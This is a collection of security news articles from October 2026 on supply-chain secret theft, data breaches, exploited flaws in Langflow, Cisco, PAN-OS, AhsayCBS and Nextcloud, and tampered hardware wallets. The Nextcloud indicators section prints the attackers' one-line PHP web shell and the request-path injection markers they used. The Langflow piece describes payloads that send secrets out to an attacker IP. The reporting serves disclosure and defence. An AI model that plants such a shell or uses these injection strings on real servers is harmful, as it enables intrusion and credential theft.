1f1bx50.text: Ravie LakshmananOct 15, 2026Supply Chain Attack / Cloud Security The credential-theft campaign known as GhostAction has ramped up, targeting more than 30,000 repositories across 3,000 users and organizations. The spike, according to GitGuardian, was observed on October 8 and 9, 2026. "This resulted from compromising the GitHub accounts of about 1,900 users. It attempted to extract 3,174 secrets from public repositories' CI," security researchers Gaetan Ferry and Guillaume Valadon said. GhostAction is the moniker for a supply chain attack campaign targeting developer infrastructure on GitHub. Originally discovered in September 2025, it involves threat actors compromising legitimate developer accounts to inject malicious GitHub Actions automation workflows into software repositories. Attackers have been found to gain write access to repositories using stolen Personal Access Tokens (PATs) or credentials harvested from infostealer logs and dumps. Using the hijacked maintainer account, they push a malicious workflow file disguised under deceptive names such as Security Audit ("security-audit.yml") or GitHub Actions Security ("github_actions_security.yml"). The end goal of the activity is the large-scale theft of continuous integration and continuous deployment (CI/CD) secrets, cloud credentials, package registry tokens (like npm, PyPI, and DockerHub), and artificial intelligence (AI) provider API keys. A new wave of GhostAction has been observed since August 31, 2026, with the malicious workflow pushed to hundreds of repositories. "This new wave seems more experimental and manual than previous ones, with the payload evolving over time," GitGuardian said. "Compared with the original GhostAction payload, the first version of this new payload added a git history secret-scanning feature." As previously outlined by Socket and StepSecurity, the history-scanning functionality features secret-detection regular expressions covering AWS key IDs, GitHub and GitLab tokens, AI-related secrets, and cloud API keys. A second version of the payload also captures about two lines of context around every AWS key ID hit so as to pair them with their matching secret access keys. A third and final variant of the payload includes support for retrieving the secret context during the git history scan. "This payload was deployed in multiple phases," GitGuardian said. "First to 160 previously observed victims, then, 20 minutes later, to 28,000 new repositories between October 8 and 9. New waves have been observed, using the same payload, on October 10 and 12. However, GitHub started preventing the malicious workflow from running starting October 9. Those two subsequent waves therefore could not extract any secrets." Interestingly, a subset of the victims from this new burst were previously compromised in the September 2025 and August 2026 waves, indicating the threat actors are banking on unrotated secrets to pull them off.

1rw5b34.text: The Legal Aid Agency (LAA), an executive agency of the UK's Ministry of Justice that manages the country's Public Defender Service, says attackers who breached its IT systems in April 2025 stole records dating back to 1978. The agency employs around 1,250 staff, oversees billions in legal funding, and works with approximately 2,000 providers, including barristers, solicitor firms, and non-profit organizations that deliver civil and criminal legal aid services in England and Wales. The LAA disclosed the cyberattack in early May 2025, warning that payment information for legal aid providers might have been compromised. Two weeks later, it confirmed the resulting data breach was more serious than first believed after finding that attackers had stolen a large trove of sensitive applicant and recipient data from 2010 onward, including contact details, dates of birth, national ID numbers, criminal history, employment status, as well as contribution amounts, debts, and payments. The threat actors have also stolen legal aid providers' data, including provider contracts, office locations, financial information, contact details, LAA Online Portal credentials (including names and email addresses), and more. In an update published this week, the LAA said follow-up analysis of the exfiltrated data found that the stolen records go back almost five decades. "The vast majority of the LAA data relates to applications, claims or payments submitted to the LAA between January 2007 and 16 May 2025, or to cases that were live during this period. However, we have now confirmed that approximately 250,000 records predate 2007," the agency said. "The overwhelming majority of these are from the 1990s and 2000s, with only a fractionally small number dating from before 1990. The earliest record currently verified dates from 1978." However, it noted that records predating 2007 do not mean everyone who received, applied for legal aid, or interacted with the justice system before 2007 was affected. "We recognise that incidents of this nature are concerning for anyone affected. That is why we published information on GOV. UK as quickly as possible and have continued to update it as our understanding of the cyber-attack has developed," a Ministry of Justice spokesperson told BleepingComputer. "Prior to the cyber-attack, we had already committed £20 million to stabilising and upgrading the Legal Aid Agency's digital systems. We are now investing more than £200 million in modernising digital services, improving resilience and strengthening cyber security across legal aid services. There is currently no evidence that any personal data believed to have been exfiltrated has been published." After the LAA breach, which was followed by a string of cyberattacks targeting the Co-op, Harrods, and Marks & Spencer (M&S) UK retail chains ​​​claimed by the DragonForce ransomware operation, the country's National Cyber Security Centre (NCSC) published guidance and advised UK organizations to follow it to strengthen their cybersecurity defenses. In January, the UK also announced a new cybersecurity strategy, backed by more than £210 million ($283 million), to boost cyber defenses across government departments and the wider public sector. This week, the UK Housing Ombudsman Service, a non-departmental public body sponsored by the Ministry of Housing that settles disputes between social housing residents and social landlords in England, disclosed that it is investigating a third-party IT security incident that impacted its case management system. 11vhh9c.text: Threat actors are exploiting a critical security flaw in Langflow, according to an alert from Previdian. Langflow is an open-source platform that allows developers to build artificial intelligence (AI) applications and agentic workflows. In February 2025, DataStax, the parent company of Langflow, was acquired by IBM. The vulnerability in question is CVE-2026-105740 (CVSS score: 9.9), a case of authenticated remote code execution impacting versions prior to 1.9.0. "Any authenticated Langflow user can achieve Remote Code Execution (RCE) on the server by adding an MCP server with the 'stdio' transport," reads an advisory released last month. "The user-supplied command field is passed directly to bash -c "exec {command}" with zero validation, no allowlisting, and no sandboxing. The command executes immediately when the server list is fetched. Additionally, the env field allows arbitrary environment variable injection (e.g., LD_PRELOAD, PATH override)." The crux of the vulnerability is that Langflow accepts a user-provided command without restricting it to approved executables. This, in turn, can lead to shell execution. In a hypothetical attack scenario, a bad actor can exploit the flaw in the following fashion - Login as a regular, non-admin user. Add a malicious MCP server by sending a crafted HTTP POST request to "/api/v2/mcp/servers/{server_name}" with a command field containing a malicious payload (e.g., a reverse shell). The server accepts and stores the attacker-supplied "command" without any validation. Trigger the flaw by fetching the MCP server list via an HTTP GET "/api/v2/mcp/servers?action_count=true" request, causing the command to execute. Achieve code execution. "Any authenticated Langflow user (including non-admin accounts) can execute arbitrary OS commands on the server with the privileges of the Langflow process," Langflow warned. Successful exploitation can result in full server compromise, environment variable injection, facilitate lateral movement, and the deployment of a persistent backdoor, as the malicious MCP server configuration persists and re-executes every time the server list is loaded. "Unlike custom component code which is visible in the flow editor, MCP server configs are stored in project settings and are not visible during normal flow review," Langflow said. Data from Previdian shows that 1,423 exploitation attempts have been recorded against its honeypot sensors since September 19, 2026, from 27 unique attacker IP addresses located in Belgium, China, Germany, Hong Kong, Japan, Nigeria, the Philippines, Russia, Seychelles, Singapore, South Korea, Taiwan, Tanzania, the U.S., and Vietnam. The exploitation efforts ramped up starting October 11, 2026, when 333 attempts were registered. As of writing, 66 attempts have been observed on October 15, 2026. "We've investigated how attackers are authenticating, as this vulnerability requires authentication," Ryan Dewhurst, founder and CEO of Previdian, told The Hacker News. "In one observed sequence, attackers checked the Langflow version, attempted /api/v1/auto_login (which returned 403 as it was disabled in our honeypot), and then successfully authenticated using a common username and password. They immediately used the resulting bearer token to access the vulnerable MCP server configuration endpoint." Some of the captured payloads include - Attempts to extract environment variables and sensitive Langflow configurations, including LANGFLOW_SECRET_KEY and LANGFLOW_SUPERUSER_PASSWORD, and transmit them to 146.70.211[.]112:18764. Docker commands attempting to access the host filesystem and read the contents of "/etc/passwd." Command execution probes using id, whoami, and other simple commands. A significant chunk of the activity originates from the IP address "192.255.229[.]92," which has been observed attempting to extract environment variables. Data from GreyNoise and Previdian shows that the IP address has engaged in generic brute-force attacks, as well as exploiting other flaws in Flowise (CVE-2026-69255) and Langflow (CVE-2026-55255, CVE-2026-9198, and CVE-2026-0768). The targeting of multiple Langflow vulnerabilities points to an unknown threat actor systematically targeting exposed instances. Their end goals are currently unclear. "We recommend upgrading Langflow to a patched version, disabling auto-login, enforcing strong and unique passwords, and reviewing authentication logs and requests to /api/v2/mcp/servers/ for suspicious activity," Dewhurst said. Last month, Langflow also addressed another critical vulnerability (CVE-2026-105697, CVSS score: 9.9) that could also result in operating system command injection through MCP stdio server configuration. If immediate patching is not an option, it's advised to set LANGFLOW_AUTO_LOGIN=false, avoid exposing Langflow directly to untrusted networks, and grant Langflow accounts to trusted users.

1urzg8c.text: Ravie LakshmananOct 15, 2026Vulnerability / Cryptojacking Singapore-based Ahsay Backup has released security updates to address two security flaws in AhsayCBS that have been exploited by bad actors to drop web shells and XMRig cryptocurrency miners. The vulnerabilities in question are CVE-2026-105133 and CVE-2026-105134, which could be chained to sidestep authentication and execute arbitrary commands on affected systems. In a report published earlier this month, Huntress said it observed threat actors combining the two flaws to achieve unauthenticated remote code execution and deploy web shells and cryptocurrency miners on exposed systems. Although the vulnerabilities were initially assumed to be addressed in AhsayCBS versions 9.15.2.59 and 10.3.4.0 released in August 2026, the software company has now confirmed that the patches did not completely plug them. The fixes are available in the following versions - AhsayCBS v10.3.4.45 hotfix AhsayCBS v9.15.2.70 hotfix "Given the severity of these risks, we strongly urge you to take immediate action to secure your environment and protect your customer's data," Ahsay said. "After applying the hotfix, please reboot your server." In an update, Huntress said it has "independently verified that the AhsayCBS 10.3.4.45 hotfix mitigates the initial entry point of this attack chain, which was still susceptible on previous v10 versions." The active exploitation of the flaws has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add them to the Known Exploited Vulnerabilities (KEV) catalog, requiring federal agencies to apply the patches by October 17, 2026.

ww9hlt.text: The Ukrainian military can again use SpaceX’s Starshield satellite service on the move, a Defense Ministry source told Recorded Future News on Thursday, days after sudden restrictions disrupted drone missions along the front line. Starshield, a military-grade version of SpaceX’s Starlink internet service, keeps Ukrainian units connected through terminals mounted on vehicles and drones as they travel. Overnight Tuesday, without warning, that connection was disrupted as new restrictions limited how fast a terminal could move and still hold a connection — forcing troops to cancel combat missions and complicating drone operations, logistics and reconnaissance. “Starshield connectivity while in motion has now been restored and remains operational,” the source said, citing reports from military units and speaking anonymously because they were not authorized to speak publicly. The ministry told Recorded Future News on Wednesday that connections had improved at speeds of up to 160 kilometers per hour (about 100 mph), though the formal speed limit remained in place. The cause of the restrictions remains unclear. Officials are in talks with SpaceX and its partners to find out, the source said. Musk points to Washington Responding Wednesday to former Ukrainian Defense Minister Mykhailo Fedorov, who called for the speed limits to be lifted entirely, Musk said the U.S. government controlled Starshield and was responsible for deciding how the service could be used. "Starshield systems are owned and controlled by the US government. Any limits on speed or usage are decided by the US military and ultimately POTUS," Musk wrote on X. Fedorov said removing Starshield’s speed limit was critical for Ukraine's defense and expressed hope that Musk would continue supporting the country. Musk, however, drew a distinction between Starshield and SpaceX's commercial Starlink service, saying the latter was intended for civilian or defensive purposes and could not be used for offensive military operations. The comments appeared to shift responsibility for the restrictions toward Washington, although officials in President Donald Trump's administration have reportedly denied involvement. Administration officials told Axios that the U.S. government did not control SpaceX and had not ordered the restrictions. Washington nevertheless planned to contact the company to determine what caused the disruptions. Drone missions disrupted The restrictions have already had consequences on the battlefield, particularly for Ukrainian drones that depend on satellite connectivity for navigation and control. Ukraine's 7th Air Assault Corps said units operating in the Huliaipole sector in southern Ukraine began reporting communication problems overnight Tuesday as the new limits took effect. According to the military, some drones experienced connection losses lasting between 10 and 20 seconds while traveling at speeds of just 110 to 120 kilometers per hour — well below the formally established threshold. Although the drones continued flying, the interruptions made them harder to control. Slowing them down to maintain connectivity also increased their vulnerability to Russian attacks. The problem was particularly severe for medium-range strike drones, which require relatively high speeds during takeoff. Under the new conditions, unstable communications could make it impossible to launch some drones or use them for their intended missions, the military said. At least one drone unit operating in the Huliaipole sector was forced to cancel some missions because of connectivity problems. Serhii Beskrestnov, a Ukrainian military technology expert and presidential adviser, said the restrictions also threatened Ukraine's ability to intercept Russian drones. He said Starlink was essential to interceptor drones used against high-speed, jet-powered Shahed drones, warning that the restrictions could deprive Ukraine of one of its few effective defenses against those weapons. “Our defense forces received no advance warning of the restriction, which caused several missions to fail. Clearly, this move cannot be a coincidence and is linked to the current political situation,” he added but didn’t provide further details. Zelensky blames Trump The Starlink disruption comes amid worsening relations between Kyiv and Washington, following disputes over Ukrainian strikes against Russian oil infrastructure and the Trump administration's decision to pursue a diesel trade agreement with Moscow. In an interview with Piers Morgan this week, Zelensky said he felt personally betrayed by Trump over the restrictions, accusing Washington of abandoning a crucial partner more than four years into Russia's full-scale invasion. The Ukrainian president alleged that both SpaceX and the United States were responsible for the disruption, which he said would cost Ukrainian lives. "I am sure they knew what they did, absolutely," Zelensky said, adding that the restrictions would result in further casualties. The Kremlin, meanwhile, said it had no official information confirming the reported restrictions. Kremlin spokesperson Dmitry Peskov added that Moscow would prefer technologies such as Starlink not to be used for military purposes in the war. A critical technology for Ukraine Starlink has played a central role in Ukraine's military communications since the beginning of Russia's full-scale invasion in 2022, when Musk activated the service following an appeal from Fedorov. SpaceX subsequently provided thousands of terminals, helping Ukraine restore communications damaged by Russian attacks. But Musk's relationship with Kyiv has become increasingly complicated. He has previously raised concerns about the costs of providing the service and the risks of its use in offensive military operations. In a separate statement yesterday, he even suggested that “it’s time for Zelensky to go.” In March 2025, however, Musk pledged never to disconnect Ukraine from Starlink, acknowledging the Ukrainian military's dependence on the technology. Earlier this year, SpaceX also took steps to prevent unauthorized Russian use of Starlink after Ukrainian officials reported that Russian forces were installing the terminals on attack drones. Ukraine also introduced a verification system that allows only registered Starlink devices to operate in Ukrainian-controlled territory. Suspected sabotage The latest restrictions come as Starlink-related infrastructure supporting Ukraine has also faced suspected sabotage in Europe. In September, a fire damaged electrical equipment at a Starlink ground station in Poland. Polish authorities investigated possible sabotage, with prosecutors saying they had grounds to suspect the perpetrators could have acted on behalf of Russian intelligence services. Earlier this week, two masked men deliberately set fire to 11 of 17 Starlink antennas at a facility near Bulgaria's capital, Sofia, according to local authorities. The antennas were used by Ukraine and other customers. There is no publicly confirmed evidence linking the two incidents or establishing Russian involvement in the Bulgarian attack. No previous articleNo new articlesDaryna Antoniukis a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.

79m46r.text: Palo Alto Networks has released security updates for a high-severity PAN-OS RCE zero-day, tracked as CVE-2026-0322, that has been exploited in attacks targeting firewalls. The vulnerability affects the PAN-OS management interface and lets authenticated attackers with network access execute code as root on vulnerable devices. Palo Alto Networks confirmed in a security advisory published Wednesday that it has seen limited exploitation of the flaw in attacks. "Very limited exploitation has been observed targeting the Palo Alto Networks management interface," the company said. The vulnerability has a severity score of 8.6 and affects PA-Series and VM-Series firewalls, as well as Panorama virtual and M-Series appliances. Palo Alto says Cloud NGFW and Prisma Access are not affected. To exploit the vulnerability, attackers need existing credentials and network access to the PAN-OS management interface. Therefore, Palo Alto Networks recommends restricting access to the management interface to trusted internal IP addresses only. The company has released fixes for affected PAN-OS 10.2, 11.1, 11.2, 12.1, and 12.2 versions, with a fix for PAN-OS 11.2.16 expected on October 15. Customers running older, unsupported versions must upgrade to a supported release. Palo Alto says there are no known workarounds for the vulnerability, but customers with Threat Prevention subscriptions can enable signatures that provide limited protection against known attack patterns. "Limited coverage in Threat Prevention means that while known attack patterns can be identified using the current Threat ID, variations may exist that cannot currently be detected," warns Palo Alto. "If this CVE and Required Configuration for Exposure impact your environment, we recommend upgrading to an unaffected version." The vulnerability was discovered internally by Suraj Siddharudh, a senior principal product security researcher at Palo Alto Networks. The company also shared three IP addresses that have been exploiting the flaw: 66.42.72[.]14, 208.83.239[.]114, and 149.248.47[.]234. BleepingComputer contacted Palo Alto Networks to learn when exploitation began, who is behind the attacks, and whether attackers compromised firewalls or used them to access internal networks. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has now added CVE-2026-0322 to the Known Exploited Vulnerabilities catalog and requires federal civilian agencies to mitigate the vulnerability by October 17. z898ch.text: The U.S. Department of Justice (DoJ) has disrupted the Famous Chollima threat group’s operations by arresting two suspects, charging 14 individuals, and seizing nearly 187 laptops used in North Korean remote IT worker schemes. Famous Chollima (a.k.a. WageMole) is commonly tracked as a North Korean threat actor associated with fraudulent IT-worker schemes that generate revenue for the DPRK regime. Because North Korea is subject to extensive international sanctions, its operatives seek technology jobs at companies worldwide, often using stolen, rented, or fabricated identities. In some cases, they also attempt to compromise employers’ networks to steal sensitive data, deploy malware, or obtain cryptocurrency and other assets. As part of an operation in Texas codenamed “Lonestar Roundup,” the FBI searched 40 residences suspected of hosting laptop farms between September 21 and 25. Laptop farms are locations where facilitators host employer-issued computers that North Korean IT workers access remotely to appear based in the United States. Law enforcement agents seized approximately 187 laptops and KVM input devices, which were used by Famous Chollima operatives that cybersecurity company CrowdStrike had been tracking since April 2025. CrowdStrike researchers say that DPRK IT workers used several methods to send the company-issued laptops to the "farm," instead of the address in the provided identity documents: Submit fake theft reports to trigger replacement shipments to the farm’s address Rotate through residential addresses to obscure the final destination Claim last-minute relocations to divert devices mid-shipment Abuse IT staffing roles they sometimes hold to covertly redirect shipments CrowdStrike says public exposure has pressured the operatives, leading them to rely more on spoofing device identifiers or even reusing identifiers across victim organizations. While CrowdStrike acknowledges that actions like Lonestar Roundup will likely have limited impact, the company called the operation “the beginning of a broader U.S. law enforcement effort to dismantle Famous Chollima’s U.S. infrastructure.” The U.S. DoJ also published an Ohio indictment describing a remote IT workers scheme that ran from 2019 to July 2025, impacted 70 companies in the country, and generated roughly $3 million for the North Korean threat actors. The workers used stolen or fabricated identities, VPNs, and proxy infrastructure to appear U.S.-based, while their American facilitators hosted the company-issued laptops, installed remote-access software, and transferred the earnings to DPRK-controlled accounts. Authorities arrested two U.S. nationals, Michael James Bostelle and Juan Cecilio Pena Carrillo, on charges of wire fraud, money laundering, and identity theft. Separately, the DoJ announced similar charges against 12 Chinese defendants. 1ds4y5s.text: Attackers are exploiting a critical flaw in Cisco Secure Email Gateway that lets a sender with no login write files to the appliance's operating system, Cisco said in an advisory on Wednesday. The attacker sends an email with a crafted attachment through the gateway and, if it succeeds, could then run commands as root. The appliance filters an organization's email for spam, malware, and other threats, and only a gateway with the File Reputation service enabled and a Content Scanner Tools package older than version 25.3.0.5525 is vulnerable. The fix has been shipping since September 14 in AsyncOS 15.5.5-014 and 16.5.0-780, the builds Cisco listed as fixed in a hardening release that day, which the company now says covered this flaw. It also arrives as a Content Scanner Tools update, version 25.3.0.5525 or later, which installs without a software upgrade or a restart. Cisco found the flaw, tracked as CVE-2026-76519 (CVSS score: 9.8), in its own internal security scanning and became aware of the attacks in October. The advisory does not say how many devices were attacked, who is behind the attacks, or whether the attackers obtained root on any of them. Cisco has contacted customers of its managed Secure Email Cloud service whose devices showed "indicators of possible compromise" and says it is engaged in remediation and recovery. Administrators of those managed gateways may not have the command-line access needed to run the compromise check below, and Cisco has already deployed the fixed scanner there, so they need no action to get the fix. Who Is Exposed Both conditions must hold. The File Reputation service, part of the Advanced Malware Protection (AMP) feature that handles attachments, must be enabled and assigned to a mail policy, and the Content Scanner Tools version must be earlier than 25.3.0.5525. Physical and virtual gateways on vulnerable AsyncOS releases are affected. Secure Email and Web Manager and Secure Web Appliance are not. To check the first condition, open Mail Policies > Incoming Mail Policies > Advanced Malware Protection, or the same path under Outgoing Mail Policies, choose a mail policy, and look at the Enable File Reputation box. To check the second, run contentscannerstatus at the CLI, which shows the version and when it was last updated. How to Fix It The quickest route is the scanner update. Gateways with automatic Content Scanner Tools updates turned on need no action once the update has applied, so confirm with contentscannerstatus that the version is 25.3.0.5525 or later rather than assuming it arrived. Where automatic updates are off, run contentscannerupdate at the CLI, or turn them on under Security Services > Service Updates. The full AsyncOS fix is in these first fixed releases: 15.5: 15.5.5-014 16.0: no fixed build. Migrate to a fixed release. 16.5: 16.5.0-780 Content Scanner Tools (all licensed and supported AsyncOS releases): 25.3.0.5525 or later Cisco recommends that any gateway earlier than 16.5 move to 16.5.0-780. A 16.0 gateway on 16.0.4-302, the build that fixed September's SQL injection flaw, is not fixed for this one, and the advisory does not list which releases count as licensed and supported for the scanner update. For a 16.0 gateway that stays on 16.0, the scanner version shown by contentscannerstatus is the only confirmation the advisory offers. There is no workaround. For a virtual appliance that shows signs of compromise, Cisco's guidance is a rebuild with new credentials, and it warns that upgrading a compromised instance destroys the forensic data and logs. How to Check for Compromise Cisco's check for attempted exploitation is one command on the appliance: grep "System Security" system_logs. It returns one of three messages: System Security: Suspected compromise indicator was found. Contact TAC for further recommendations. Compromise detected. Follow the recovery steps below. System Security: Security scan did not complete. Contact TAC for further recommendations. Contact Cisco's Technical Assistance Center (TAC). System Security: No compromise indicator was found. No compromise detected by this check. Upgrade if the device is on an affected release. Run it on every member of a cluster. A clean result is not proof: an attacker with root could remove or hide evidence, so also check firewall and network logs outside the device for unexpected uploads to external IP addresses or downloads from malicious ones. The advisory does not say what the scan looks for. If a Device Is Compromised For a physical appliance, Cisco asks customers to contact TAC and to enable remote access so its engineers can investigate. For a virtual appliance, its steps are: Preserve forensic data first. Upgrading a compromised instance destroys its logs and evidence. Deploy a new virtual machine on a fixed release. Rebuild the configuration without importing any previous configuration file. Renew the credentials and cryptographic material on the appliance, then keep monitoring for unusual behavior. Cluster members authenticate to each other with SSH key pairs. A compromised member's private keys could give the attacker a way into the others, so Cisco recommends restoring every member of a cluster that contains at least one compromised appliance. Secure Email Cloud customers it has contacted are asked to renew credentials and cryptographic material where possible. The September Release This is the second Secure Email Gateway flaw Cisco has confirmed under attack in a month. On September 14 it disclosed CVE-2026-76461, a SQL injection flaw in the gateway's email parsing that could let an unauthenticated sender run commands as root through a crafted email. That flaw affects every configuration and was added to CISA's Known Exploited Vulnerabilities catalog the same day. The two flaws sit in different parts of the software and have different log checks, and Cisco has not linked the attacks. The same day, Cisco published a hardening release for the gateway and for Secure Email and Web Manager that grouped internally found bugs into five umbrella CVEs by weakness class: CVE-2026-76440, CVE-2026-76441, CVE-2026-20353, and CVE-2026-76443, each scored 9.8, and CVE-2026-76442 at 7.5. Each score is the highest among the bugs in that class, and the advisory carried the 15.5.5-014 and 16.5.0-780 builds. Cisco updated that advisory on Wednesday, and it now says "Two of them are known to be actively exploited": the file-write flaw, which sits in the path traversal class, and the September SQL injection flaw, which sits in the improper neutralization class. It is not aware of attacks on the other bugs in the release. Under a disclosure policy Cisco set out in June, bugs fixed in hardening releases share grouped CVEs, and a flaw gets its own CVE when, among other reasons, it is known to be exploited. The file-write flaw was fixed in September inside the path traversal group and received its own advisory on Wednesday. It is also the third root-level flaw in these appliances that Cisco has confirmed exploited since December, when a China-linked group that Cisco Talos tracks as UAT-9686 used a zero-day in the spam quarantine feature, CVE-2025-20393, that Cisco patched in January.

yd7bd7.text: Ledger is asking resellers and distributors in Southeast Asia and Hong Kong to halt wallet sales and remove products from shelves while it investigates hardware implant incidents. The company announced the decision in response to discovering that devices purchased from CryptoBilis had been modified to steal seed phrases used to access crypto assets and send them to an unauthorized party over an LTE connection. Ledger sells physical cryptocurrency wallets that securely store private keys used for managing and authorizing digital asset transactions. Following reports of cryptocurrency losses from multiple users, Ledger launched an investigation on October 9 and confirmed that some devices sold by CryptoBilis had been tampered with. Yesterday, Ledger’s Donjon security arm shared more details about the hardware implant found inside devices from the reseller , largely confirming earlier reports by Mark Karpelès and Tibane Labs. Donjon said the implant’s microcontroller detects and decodes the 24-word recovery phrase for setting up and restoring the wallet, then transmits it over LTE using a provisioned eSIM. The implant is a separate component that does not modify the Secure Element or Ledger operating system, or alter transactions or signatures, which makes it undetectable by Ledger’s integrity self-checks. More implants discovered Ledger says all confirmed fund losses involve devices sold by Southeast Asian reseller CryptoBilis, but users have also reported compromised devices purchased from other sellers across Asia and Europe. Some users reported buying modified wallets from a Metapod tech retailer at an airport in Singapore and via MediaMarkt in Europe. MediaMarkt, which gets Ledger devices from distributor Aqipa GmbH, has now pulled the product from its shelves after these reports. Ledger has now ordered a broader sales halt covering all distributors in Southeast Asia (Indonesia, Singapore, Thailand, the Philippines, Vietnam, Malaysia) and Hong Kong until investigations into device safety are complete. The company reminded users that its infrastructure, systems, services, and direct sales channel are safe to use. Trezor reduces reseller network Trezor, another major cryptocurrency hardware wallet vendor, announced plans to reduce its reseller network to strengthen oversight and prevent supply-chain attacks. “Supply-chain security is never finished, so we are raising the bar for every partner who continues with Trezor, with an updated legal framework and closer checks on how devices are sourced, stored, and handled,” Trezor said. Trezor said it has found no evidence that its devices were compromised but decided to act swiftly as a precaution. In a letter to affected resellers, the company said their partnerships would end on January 1, 2027, when their authorization to sell Trezor devices will be revoked. k86j8x.text: Attackers exploited a flaw in an optional Nextcloud app, Collabora Online - Built-in CODE Server, to plant web shells on Nextcloud servers. Three administrators reported the issue on GitHub, with the first logged attack on September 10. A web shell is a small file that executes any command an attacker sends via a web request, with the rights of the web server account. The flaw allows an unauthenticated request to run a command on the server, but only when the app's local document server is not running, such as during a restart or upgrade, or after a crash. Collabora fixed it in version 26.4.303 on September 11 and on October 14 published an advisory with the identifier CVE-2026-110447, warning that turning off the app does not help: it must be updated or removed. Who Is Affected The app, published by Collabora under the package name richdocumentscode, downloads a copy of Collabora Online Development Edition (CODE) and runs it on the Nextcloud server itself. That lets Nextcloud Office edit documents without a separate Collabora server. Its store listing says it is "for local testing and non-production use" and "for personal use or for small teams." Collabora's advisory covers every version before 26.4.303 and says standalone Collabora Online servers are not affected. A warning posted on the Nextcloud community forum on October 3 stated that an installation is not affected if it uses only the Nextcloud Office app ( richdocuments) without the built-in app, whether its Collabora server runs in Docker, from a Linux package, or at a hosting provider. The app's proxy.php script starts the local CODE server whenever a request arrives, and nothing is listening. In versions up to 26.4.302, the script placed text from the request, including its path, inside a double-quoted bash command, where the shell still runs anything written as $(...). A request with a command hidden in its path ran that command as the web server user. Because the script only builds that command when it needs to start the server, the attack works only while the server is down, such as during a container restart, an upgrade, or a crash. The script is a plain PHP file that the web server runs directly from the app's folder and loads none of Nextcloud's code. "It is not sufficient to disable the app to avoid the problem; it must be upgraded to >= 26.4.303 or removed," Collabora said in the advisory. The fixed versions require Nextcloud 30 or later. Nextcloud 29 and older are end of life, and the app store still serves them an affected version, so their users should upgrade Nextcloud or remove the app. Collabora's fix for a separate command-injection flaw in the same script, CVE-2025-66208, disclosed last December, does not prevent this one. What the Attackers Did The first report came from an administrator who hosts several Nextcloud servers and wrote on GitHub that the servers had been hacked since the day before. Access logs from two of them show requests at 19:51 on September 10 and 09:56 on September 11 (UTC+2), both from one IP address and both aimed at proxy.php?status with a shell command hidden in the request path. All of the administrator's servers ran version 26.4.302. The command decoded a one-line PHP web shell into the app's folder and tried to send the server's uname -a output to a webhook.site address. On one server, the attacker then used the shell to search for credential stores and cryptocurrency wallets, including *.kdbx, wallet.dat and keystore.json files and names such as bitwarden, 1password, .bitcoin, .electrum, .monero and .ethereum. The reviewed requests showed no commands that archived, uploaded, or copied out files, but anything the web server account can read must be treated as potentially exposed, the administrator wrote. Two other administrators reported the same on their own instances. One found the shell when Nextcloud's integrity check flagged a new PHP file, and the other learned of the break-in from emails about failed sudo attempts on the server. None of the reports show the attacker gaining root access. After updating to 26.4.303, one of them logged another attempt on September 14 from a second IP address with a payload of the same kind. The CODE server it started carried the attack text in its startup options, but no new shell file appeared. The output "looks scary but should be harmless," replied mmeeks, who answered for the project in the thread, telling users to update and to remove any leftover shx*.php files. The CVE record describes the flaw as "exploited in the wild in September and October 2026." How many servers were hit is not known. "This impacts only the Development Edition, and only in this (rather rarer) Built-in CODE Server deployment mode that downloads a local appimage," mmeeks wrote. What to Do Now What to do, in order: Update richdocumentscode, which appears in Nextcloud's app list as Collabora Online - Built-in CODE Server, to 26.4.303 or later, or remove the app. Disabling it in Nextcloud does not close the flaw. On Nextcloud 29 or older, which cannot install 26.4.303, upgrade Nextcloud or remove the app. If you already updated, look for shx*.php files, starting in apps/richdocumentscode, and delete them. Then check your access logs back to at least September 10 for proxy.php?status requests whose path contains %2e%2e, $( or ${IFS}, and look for sudo attempts by the web server account. Treat anything that account could read as potentially exposed, as the first reporter advised. Version 26.4.402, released September 24, rewrote the start command to pass each option as a separate argument, but administrators report that it fails to start or fails to open documents on some setups and have gone back to 26.4.303, the version the advisory names as the fix. No newer release had appeared as of October 14. Indicators from the administrators' logs: File: shrf4645.php, shxa35d0.php, shx5cf91.php, shxd33ce.php and shxf4645.php, found in apps/richdocumentscode/ on the first reporter's servers File: shx13a86.php, found by a second administrator (location not stated) File: shx56367.php, the name in the September 14 attempt that created no file SHA-256: 4b9fbd0663fbfd6028fc216ed18e0d6ef3ae498a7fdc97083e4b0ce3cec40562, the one-line shell <?php $c=$_GET['c']??'id'; echo shell_exec($c.' 2>&1'); Path: /apps/richdocumentscode/proxy.php?status IP: 139.28[.]18[.]122 (September 10 and 11 attacks), 89.38[.]98[.]50 (September 14 attempt against a patched server) Request markers: %2e%2e, $(, ${IFS}, and base64 -d piped to sh, all in the request path Domain: webhook[.]site, a public service, with callback IDs 45060ed4-de0b-4119-8f0d-2a2776bbd413 and 774cf5e1-b5a4-4174-a1ad-0241861029a2 A Fix That Shipped Without a Security Notice The code change that closed the flaw is four lines in proxy.php. The start command is now handed to bash as a single escaped argument instead of a double-quoted string, so the shell that receives it no longer expands text from the request. The repository's commit record shows the change was written on August 20 by Caolán McNamara, who also published the advisory, under the title "tidy up how the coolwsd launch command is built." It was not in version 26.4.302, released on August 31, and was committed on September 9. The first logged attack came on September 10, and 26.4.303 followed on September 11 with release notes that name only the bundled CODE build. The administrator who reported the attacks disabled the app while waiting for a fix, the step the advisory now says is not enough. In the thread, mmeeks told users to update, promised "more updates in due course," and pointed to a "record backlog" at GitHub's advisory database, linking to a June post in which GitHub said its processing had fallen weeks behind. On October 3, a member of the Nextcloud community forum warned other users to update at once because the flaw was "already being exploited" and "no warning or CVE has been published." The CVE and the advisory came on October 14. The advisory credits a GitHub user, wwwshellcodeit, as the reporter, and neither it nor the thread says when the report came or when Collabora learned the change was a security fix.

